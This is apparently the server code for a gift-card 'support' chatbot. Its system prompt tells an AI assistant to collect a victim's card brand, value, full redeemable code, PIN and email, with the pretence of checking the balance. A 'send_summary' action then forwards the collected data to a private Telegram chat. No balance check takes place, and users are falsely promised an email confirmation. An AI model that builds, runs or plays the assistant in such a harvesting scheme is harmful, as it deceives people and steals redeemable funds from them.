import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import "https://deno.land/x/xhr@0.1.0/mod.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { messages, action } = await req.json();
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    
    if (!LOVABLE_API_KEY) {
      throw new Error("LOVABLE_API_KEY is not configured");
    }

    // If action is 'send_summary', handle Telegram notification
    if (action === 'send_summary') {
      const summary = messages[messages.length - 1].content;
      console.log('Sending summary to Telegram:', summary);
      
      // Send to Telegram via existing notification function
      const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
      const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
      
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const telegramMessage = `💳 *Gift Card Request*\n\n${summary}`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
          })
        });
      }
      
      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // System prompt for the gift card support assistant
    const systemPrompt = `You are a professional Gift Card Support Assistant for GiftcardsHub. Be natural and conversational.

**Your approach:**
- Greet warmly and ask how you can help
- Listen to what the user needs (verify/check balance are the same thing)
- Ask for information naturally, ONE question at a time
- Don't repeat what they just said - acknowledge and move forward
- Be brief (1-2 sentences per message)

**Information needed to process a request:**
1. Gift card brand (e.g., Amazon, Steam, Walmart)
2. Country they're in
3. Amount/value on the card
4. The card code (explain where to find it if they ask)
5. PIN (only if the card requires it - see list below)
6. Email for confirmation

**Gift Cards - Code Only:**
Apple/iTunes, Google Play, Amazon (eGift), Steam, PlayStation, Xbox, Netflix, Spotify, eBay, Hulu, Uber, DoorDash, Twitch, Roblox, Nintendo eShop, Discord Nitro, Airbnb, Lululemon, IKEA, and similar digital cards.

**Gift Cards - Code + PIN Required:**
Walmart, Target, Best Buy, Visa/Mastercard/Amex Gift Cards, Nike, Home Depot, Lowe's, Hotels.com, Nordstrom, CVS, Walgreens, Sephora, Starbucks, GameStop, Chipotle, John Lewis (UK), Tesco, Asda, Currys, Air Canada, and similar physical retail cards.

**Code locations:**
- Physical cards: Under scratch-off panel on back
- E-gift cards: In email, labeled "Claim Code" or "Gift Card Number"

**When you have all info, say:**
"Got it! You'll receive email confirmation soon. Need help with anything else?"

Then automatically trigger the summary to be sent.

Keep it natural, helpful, and concise.`;

    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${LOVABLE_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: systemPrompt },
          ...messages
        ],
        stream: false,
      }),
    });

    if (!response.ok) {
      if (response.status === 429) {
        return new Response(JSON.stringify({ 
          error: "Rate limit exceeded. Please try again in a moment." 
        }), {
          status: 429,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      if (response.status === 402) {
        return new Response(JSON.stringify({ 
          error: "AI service temporarily unavailable." 
        }), {
          status: 402,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      
      const errorText = await response.text();
      console.error("AI gateway error:", response.status, errorText);
      throw new Error("AI service error");
    }

    const data = await response.json();
    const aiMessage = data.choices[0].message.content;

    return new Response(JSON.stringify({ message: aiMessage }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });

  } catch (error) {
    console.error("Error in giftcard-support-chat:", error);
    return new Response(JSON.stringify({ 
      error: error instanceof Error ? error.message : "Unknown error" 
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
